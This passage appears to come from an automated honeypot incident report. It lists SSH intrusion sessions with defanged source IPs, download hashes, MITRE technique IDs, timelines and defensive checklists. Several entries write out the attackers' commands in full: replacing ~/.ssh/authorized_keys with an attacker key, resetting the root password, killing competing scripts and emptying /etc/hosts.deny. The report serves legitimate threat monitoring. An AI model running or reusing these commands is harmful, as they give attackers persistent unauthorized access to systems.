| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 04:16:15` | `cowrie.session.connect` |
| `2026-04-15 04:16:15` | `cowrie.client.version` |
| `2026-04-15 04:16:15` | `cowrie.client.kex` |
| `2026-04-15 04:16:15` | `cowrie.login.success` |
| `2026-04-15 04:16:16` | `cowrie.session.params` |
| `2026-04-15 04:16:16` | `cowrie.command.input` |
| `2026-04-15 04:16:16` | `cowrie.command.failed` |
| `2026-04-15 04:16:16` | `cowrie.log.closed` |
| `2026-04-15 04:16:17` | `cowrie.session.params` |
| `2026-04-15 04:16:17` | `cowrie.command.input` |
| `2026-04-15 04:16:17` | `cowrie.session.file_download` |
| `2026-04-15 04:16:17` | `cowrie.log.closed` |
| `2026-04-15 04:16:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.120[.]138` to AbuseIPDB if not already reported
- [ ] Block `14.103.120[.]138` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4f74895c7723

| Field | Detail |
|---|---|
| **Source IP** | `43.153.12[.]68` |
| **First Seen** | 2026-04-15 04:16 |
| **Last Seen** | 2026-04-15 04:16 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 04:16:21` | `cowrie.session.connect` |
| `2026-04-15 04:16:21` | `cowrie.client.version` |
| `2026-04-15 04:16:21` | `cowrie.client.kex` |
| `2026-04-15 04:16:22` | `cowrie.login.success` |
| `2026-04-15 04:16:23` | `cowrie.session.params` |
| `2026-04-15 04:16:23` | `cowrie.command.input` |
| `2026-04-15 04:16:23` | `cowrie.command.failed` |
| `2026-04-15 04:16:23` | `cowrie.log.closed` |
| `2026-04-15 04:16:24` | `cowrie.session.params` |
| `2026-04-15 04:16:24` | `cowrie.command.input` |
| `2026-04-15 04:16:24` | `cowrie.session.file_download` |
| `2026-04-15 04:16:24` | `cowrie.log.closed` |
| `2026-04-15 04:16:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.153.12[.]68` to AbuseIPDB if not already reported
- [ ] Block `43.153.12[.]68` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-43163c8cd74b

| Field | Detail |
|---|---|
| **Source IP** | `14.103.120[.]138` |
| **First Seen** | 2026-04-15 04:16 |
| **Last Seen** | 2026-04-15 04:16 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 04:16:23` | `cowrie.session.connect` |
| `2026-04-15 04:16:23` | `cowrie.client.version` |
| `2026-04-15 04:16:23` | `cowrie.client.kex` |
| `2026-04-15 04:16:23` | `cowrie.login.success` |
| `2026-04-15 04:16:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.120[.]138` to AbuseIPDB if not already reported
- [ ] Block `14.103.120[.]138` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6544ec4a99a3

| Field | Detail |
|---|---|
| **Source IP** | `43.153.12[.]68` |
| **First Seen** | 2026-04-15 04:16 |
| **Last Seen** | 2026-04-15 04:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 04:16:27` | `cowrie.session.connect` |
| `2026-04-15 04:16:27` | `cowrie.client.version` |
| `2026-04-15 04:16:27` | `cowrie.client.kex` |
| `2026-04-15 04:16:28` | `cowrie.login.success` |
| `2026-04-15 04:16:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.153.12[.]68` to AbuseIPDB if not already reported
- [ ] Block `43.153.12[.]68` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fd96bc97d31c

| Field | Detail |
|---|---|
| **Source IP** | `46.188.119[.]26` |
| **First Seen** | 2026-04-15 04:17 |
| **Last Seen** | 2026-04-15 04:17 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 04:17:51` | `cowrie.session.connect` |
| `2026-04-15 04:17:51` | `cowrie.client.version` |
| `2026-04-15 04:17:51` | `cowrie.client.kex` |
| `2026-04-15 04:17:52` | `cowrie.login.success` |
| `2026-04-15 04:17:52` | `cowrie.session.params` |
| `2026-04-15 04:17:52` | `cowrie.command.input` |
| `2026-04-15 04:17:52` | `cowrie.command.failed` |
| `2026-04-15 04:17:53` | `cowrie.log.closed` |
| `2026-04-15 04:17:53` | `cowrie.session.params` |
| `2026-04-15 04:17:53` | `cowrie.command.input` |
| `2026-04-15 04:17:53` | `cowrie.session.file_download` |
| `2026-04-15 04:17:53` | `cowrie.log.closed` |
| `2026-04-15 04:17:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `46.188.119[.]26` to AbuseIPDB if not already reported
- [ ] Block `46.188.119[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1a19956ad3fe

| Field | Detail |
|---|---|
| **Source IP** | `46.188.119[.]26` |
| **First Seen** | 2026-04-15 04:17 |
| **Last Seen** | 2026-04-15 04:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 04:17:56` | `cowrie.session.connect` |
| `2026-04-15 04:17:56` | `cowrie.client.version` |
| `2026-04-15 04:17:56` | `cowrie.client.kex` |
| `2026-04-15 04:17:56` | `cowrie.login.success` |
| `2026-04-15 04:17:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `46.188.119[.]26` to AbuseIPDB if not already reported
- [ ] Block `46.188.119[.]26` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0c5a560c2172

| Field | Detail |
|---|---|
| **Source IP** | `43.153.12[.]68` |
| **First Seen** | 2026-04-15 04:20 |
| **Last Seen** | 2026-04-15 04:20 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 04:20:06` | `cowrie.session.connect` |
| `2026-04-15 04:20:06` | `cowrie.client.version` |
| `2026-04-15 04:20:07` | `cowrie.client.kex` |
| `2026-04-15 04:20:08` | `cowrie.login.success` |
| `2026-04-15 04:20:08` | `cowrie.session.params` |
| `2026-04-15 04:20:08` | `cowrie.command.input` |
| `2026-04-15 04:20:08` | `cowrie.command.failed` |
| `2026-04-15 04:20:09` | `cowrie.log.closed` |
| `2026-04-15 04:20:09` | `cowrie.session.params` |
| `2026-04-15 04:20:09` | `cowrie.command.input` |
| `2026-04-15 04:20:09` | `cowrie.session.file_download` |
| `2026-04-15 04:20:09` | `cowrie.log.closed` |
| `2026-04-15 04:20:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.153.12[.]68` to AbuseIPDB if not already reported
- [ ] Block `43.153.12[.]68` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1cacc4f95b20

| Field | Detail |
|---|---|
| **Source IP** | `43.153.12[.]68` |
| **First Seen** | 2026-04-15 04:20 |
| **Last Seen** | 2026-04-15 04:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 04:20:12` | `cowrie.session.connect` |
| `2026-04-15 04:20:12` | `cowrie.client.version` |
| `2026-04-15 04:20:13` | `cowrie.client.kex` |
| `2026-04-15 04:20:14` | `cowrie.login.success` |
| `2026-04-15 04:20:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.153.12[.]68` to AbuseIPDB if not already reported
- [ ] Block `43.153.12[.]68` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6534c992bafd

| Field | Detail |
|---|---|
| **Source IP** | `46.188.119[.]26` |
| **First Seen** | 2026-04-15 04:21 |
| **Last Seen** | 2026-04-15 04:21 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 04:21:03` | `cowrie.session.connect` |
| `2026-04-15 04:21:03` | `cowrie.client.version` |
| `2026-04-15 04:21:03` | `cowrie.client.kex` |
| `2026-04-15 04:21:04` | `cowrie.login.success` |
| `2026-04-15 04:21:04` | `cowrie.session.params` |
| `2026-04-15 04:21:04` | `cowrie.command.input` |
| `2026-04-15 04:21:04` | `cowrie.command.failed` |
| `2026-04-15 04:21:04` | `cowrie.log.closed` |
| `2026-04-15 04:21:05` | `cowrie.session.params` |
| `2026-04-15 04:21:05` | `cowrie.command.input` |
| `2026-04-15 04:21:05` | `cowrie.session.file_download` |
| `2026-04-15 04:21:05` | `cowrie.log.closed` |
| `2026-04-15 04:21:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `46.188.119[.]26` to AbuseIPDB if not already reported
- [ ] Block `46.188.119[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7be323678023

| Field | Detail |
|---|---|
| **Source IP** | `46.188.119[.]26` |
| **First Seen** | 2026-04-15 04:21 |
| **Last Seen** | 2026-04-15 04:21 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 04:21:07` | `cowrie.session.connect` |
| `2026-04-15 04:21:07` | `cowrie.client.version` |
| `2026-04-15 04:21:07` | `cowrie.client.kex` |
| `2026-04-15 04:21:08` | `cowrie.login.success` |
| `2026-04-15 04:21:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `46.188.119[.]26` to AbuseIPDB if not already reported
- [ ] Block `46.188.119[.]26` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5d2495a835d5

| Field | Detail |
|---|---|
| **Source IP** | `14.103.120[.]138` |
| **First Seen** | 2026-04-15 04:21 |
| **Last Seen** | 2026-04-15 04:22 |
| **Session Duration** | 23s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:zb32vjah8mAe"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 04:21:41` | `cowrie.session.connect` |
| `2026-04-15 04:21:41` | `cowrie.client.version` |
| `2026-04-15 04:21:41` | `cowrie.client.kex` |
| `2026-04-15 04:21:42` | `cowrie.login.success` |
| `2026-04-15 04:21:42` | `cowrie.session.params` |
| `2026-04-15 04:21:42` | `cowrie.command.input` |
| `2026-04-15 04:21:42` | `cowrie.command.failed` |
| `2026-04-15 04:21:43` | `cowrie.log.closed` |
| `2026-04-15 04:21:43` | `cowrie.session.params` |
| `2026-04-15 04:21:43` | `cowrie.command.input` |
| `2026-04-15 04:21:44` | `cowrie.session.file_download` |
| `2026-04-15 04:21:44` | `cowrie.log.closed` |
| `2026-04-15 04:21:57` | `cowrie.session.params` |
| `2026-04-15 04:21:57` | `cowrie.command.input` |
| `2026-04-15 04:21:58` | `cowrie.log.closed` |
| `2026-04-15 04:21:58` | `cowrie.session.params` |
| `2026-04-15 04:21:58` | `cowrie.command.input` |
| `2026-04-15 04:21:58` | `cowrie.log.closed` |
| `2026-04-15 04:21:58` | `cowrie.session.params` |
| `2026-04-15 04:21:58` | `cowrie.command.input` |
| `2026-04-15 04:21:58` | `cowrie.session.file_download` |
| `2026-04-15 04:21:58` | `cowrie.log.closed` |
| `2026-04-15 04:21:59` | `cowrie.session.params` |
| `2026-04-15 04:21:59` | `cowrie.command.input` |
| `2026-04-15 04:21:59` | `cowrie.log.closed` |
| `2026-04-15 04:21:59` | `cowrie.session.params` |
| `2026-04-15 04:21:59` | `cowrie.command.input` |
| `2026-04-15 04:21:59` | `cowrie.log.closed` |
| `2026-04-15 04:22:00` | `cowrie.session.params` |
| `2026-04-15 04:22:00` | `cowrie.command.input` |
| `2026-04-15 04:22:00` | `cowrie.command.input` |
| `2026-04-15 04:22:00` | `cowrie.log.closed` |
| `2026-04-15 04:22:00` | `cowrie.session.params` |
| `2026-04-15 04:22:00` | `cowrie.command.input` |
| `2026-04-15 04:22:00` | `cowrie.log.closed` |
| `2026-04-15 04:22:01` | `cowrie.session.params` |
| `2026-04-15 04:22:01` | `cowrie.command.input` |
| `2026-04-15 04:22:01` | `cowrie.log.closed` |
| `2026-04-15 04:22:01` | `cowrie.session.params` |
| `2026-04-15 04:22:01` | `cowrie.command.input` |
| `2026-04-15 04:22:01` | `cowrie.log.closed` |
| `2026-04-15 04:22:02` | `cowrie.session.params` |
| `2026-04-15 04:22:02` | `cowrie.command.input` |
| `2026-04-15 04:22:02` | `cowrie.log.closed` |
| `2026-04-15 04:22:02` | `cowrie.session.params` |
| `2026-04-15 04:22:02` | `cowrie.command.input` |
| `2026-04-15 04:22:02` | `cowrie.log.closed` |
| `2026-04-15 04:22:03` | `cowrie.session.params` |
| `2026-04-15 04:22:03` | `cowrie.command.input` |
| `2026-04-15 04:22:03` | `cowrie.log.closed` |
| `2026-04-15 04:22:03` | `cowrie.session.params` |
| `2026-04-15 04:22:03` | `cowrie.command.input` |
| `2026-04-15 04:22:03` | `cowrie.log.closed` |
| `2026-04-15 04:22:04` | `cowrie.session.params` |
| `2026-04-15 04:22:04` | `cowrie.command.input` |
| `2026-04-15 04:22:04` | `cowrie.log.closed` |
| `2026-04-15 04:22:04` | `cowrie.session.params` |
| `2026-04-15 04:22:04` | `cowrie.command.input` |
| `2026-04-15 04:22:04` | `cowrie.log.closed` |
| `2026-04-15 04:22:04` | `cowrie.session.params` |
| `2026-04-15 04:22:04` | `cowrie.command.input` |
| `2026-04-15 04:22:05` | `cowrie.log.closed` |
| `2026-04-15 04:22:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.120[.]138` to AbuseIPDB if not already reported
- [ ] Block `14.103.120[.]138` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6e5c16de4aa7

| Field | Detail |
|---|---|
| **Source IP** | `46.188.119[.]26` |
| **First Seen** | 2026-04-15 04:22 |
| **Last Seen** | 2026-04-15 04:22 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 04:22:10` | `cowrie.session.connect` |
| `2026-04-15 04:22:10` | `cowrie.client.version` |
| `2026-04-15 04:22:10` | `cowrie.client.kex` |
| `2026-04-15 04:22:11` | `cowrie.login.success` |
| `2026-04-15 04:22:11` | `cowrie.session.params` |
| `2026-04-15 04:22:11` | `cowrie.command.input` |
| `2026-04-15 04:22:11` | `cowrie.command.failed` |
| `2026-04-15 04:22:11` | `cowrie.log.closed` |
| `2026-04-15 04:22:12` | `cowrie.session.params` |
| `2026-04-15 04:22:12` | `cowrie.command.input` |
| `2026-04-15 04:22:12` | `cowrie.session.file_download` |
| `2026-04-15 04:22:12` | `cowrie.log.closed` |
| `2026-04-15 04:22:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `46.188.119[.]26` to AbuseIPDB if not already reported
- [ ] Block `46.188.119[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-30e7dc0ccfb8

| Field | Detail |
|---|---|
| **Source IP** | `46.188.119[.]26` |
| **First Seen** | 2026-04-15 04:22 |
| **Last Seen** | 2026-04-15 04:22 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 04:22:14` | `cowrie.session.connect` |
| `2026-04-15 04:22:14` | `cowrie.client.version` |
| `2026-04-15 04:22:14` | `cowrie.client.kex` |
| `2026-04-15 04:22:15` | `cowrie.login.success` |
| `2026-04-15 04:22:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `46.188.119[.]26` to AbuseIPDB if not already reported
- [ ] Block `46.188.119[.]26` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-26848b5346fd

| Field | Detail |
|---|---|
| **Source IP** | `14.103.114[.]205` |
| **First Seen** | 2026-04-15 04:23 |
| **Last Seen** | 2026-04-15 04:23 |
| **Session Duration** | 25s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:tgi4duOKnxWr"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 04:23:15` | `cowrie.session.connect` |
| `2026-04-15 04:23:15` | `cowrie.client.version` |
| `2026-04-15 04:23:15` | `cowrie.client.kex` |
| `2026-04-15 04:23:16` | `cowrie.login.success` |
| `2026-04-15 04:23:16` | `cowrie.session.params` |
| `2026-04-15 04:23:16` | `cowrie.command.input` |
| `2026-04-15 04:23:16` | `cowrie.command.failed` |
| `2026-04-15 04:23:17` | `cowrie.log.closed` |
| `2026-04-15 04:23:17` | `cowrie.session.params` |
| `2026-04-15 04:23:17` | `cowrie.command.input` |
| `2026-04-15 04:23:17` | `cowrie.session.file_download` |
| `2026-04-15 04:23:17` | `cowrie.log.closed` |
| `2026-04-15 04:23:27` | `cowrie.session.params` |
| `2026-04-15 04:23:27` | `cowrie.command.input` |
| `2026-04-15 04:23:28` | `cowrie.log.closed` |
| `2026-04-15 04:23:28` | `cowrie.session.params` |
| `2026-04-15 04:23:28` | `cowrie.command.input` |
